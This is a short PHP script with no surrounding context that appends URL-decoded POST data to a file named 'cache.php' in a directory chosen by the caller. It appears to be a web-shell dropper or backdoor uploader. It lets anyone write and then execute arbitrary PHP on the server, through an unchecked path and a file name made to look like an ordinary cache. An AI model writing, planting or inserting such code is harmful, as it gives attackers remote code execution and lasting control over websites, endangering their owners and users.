<?
$myFile = $_POST['acc']."/cache.php";
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = rawUrlDecode($_POST['data']);
fwrite($fh, $stringData);
fclose($fh);
?>